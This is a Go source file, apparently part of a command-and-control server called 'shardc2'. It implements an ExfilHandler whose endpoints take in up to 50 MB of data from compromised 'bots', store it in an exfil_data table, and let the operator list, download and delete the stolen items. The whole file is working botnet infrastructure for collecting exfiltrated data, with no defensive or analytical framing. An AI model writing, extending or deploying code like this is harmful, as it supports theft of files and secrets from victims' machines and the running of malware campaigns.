package handlers

import (
	"database/sql"
	"fmt"
	"strings"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/shardc2/shardc2/internal/database"
)

type ExfilHandler struct {
	db *database.DB
}

func NewExfilHandler(db *database.DB) *ExfilHandler {
	return &ExfilHandler{db: db}
}

func (h *ExfilHandler) Upload(c *fiber.Ctx) error {
	var req struct {
		Type     string `json:"type"`
		Filename string `json:"filename"`
		Data     []byte `json:"data"`
	}
	if err := c.BodyParser(&req); err != nil {
		return c.Status(400).JSON(fiber.Map{"error": "invalid request body"})
	}
	if req.Type == "" || len(req.Data) == 0 {
		return c.Status(400).JSON(fiber.Map{"error": "type and data required"})
	}
	if len(req.Data) > 50*1024*1024 {
		return c.Status(400).JSON(fiber.Map{"error": "data too large (max 50MB)"})
	}

	botID, _ := c.Locals("bot_id").(string)

	var id string
	err := h.db.QueryRow(`
		INSERT INTO exfil_data (bot_id, type, filename, data, size)
		VALUES ($1, $2, $3, $4, $5) RETURNING id`,
		botID, req.Type, req.Filename, req.Data, len(req.Data),
	).Scan(&id)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to store data"})
	}

	return c.Status(201).JSON(fiber.Map{"id": id, "status": "uploaded", "size": len(req.Data)})
}

func (h *ExfilHandler) List(c *fiber.Ctx) error {
	query := `SELECT id, COALESCE(bot_id::text, ''), type, COALESCE(filename, ''), size, uploaded_at FROM exfil_data`
	args := []interface{}{}

	if botID := c.Query("bot_id"); botID != "" {
		query += " WHERE bot_id = $1"
		args = append(args, botID)
	}
	query += " ORDER BY uploaded_at DESC LIMIT 100"

	rows, err := h.db.Query(query, args...)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to list exfil data"})
	}
	defer rows.Close()

	var items []fiber.Map
	for rows.Next() {
		var id, botID, dataType, filename string
		var size int64
		var uploadedAt time.Time
		if err := rows.Scan(&id, &botID, &dataType, &filename, &size, &uploadedAt); err != nil {
			continue
		}
		items = append(items, fiber.Map{
			"id": id, "bot_id": botID, "type": dataType, "filename": filename,
			"size": size, "uploaded_at": uploadedAt,
		})
	}
	if items == nil {
		items = []fiber.Map{}
	}
	return c.JSON(fiber.Map{"data": items, "count": len(items)})
}

func (h *ExfilHandler) Download(c *fiber.Ctx) error {
	id := c.Params("id")

	var data []byte
	var filename, dataType string
	err := h.db.QueryRow(`SELECT data, COALESCE(filename, 'download'), type FROM exfil_data WHERE id = $1`, id).Scan(&data, &filename, &dataType)
	if err == sql.ErrNoRows {
		return c.Status(404).JSON(fiber.Map{"error": "not found"})
	}
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to fetch data"})
	}

	sanitized := strings.NewReplacer(`"`, `\"`, "\r", "", "\n", "").Replace(filename)
	c.Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, sanitized))
	c.Set("Content-Type", "application/octet-stream")
	return c.Send(data)
}

func (h *ExfilHandler) Delete(c *fiber.Ctx) error {
	id := c.Params("id")
	result, err := h.db.Exec(`DELETE FROM exfil_data WHERE id = $1`, id)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to delete"})
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return c.Status(404).JSON(fiber.Map{"error": "not found"})
	}
	return c.JSON(fiber.Map{"status": "deleted"})
}
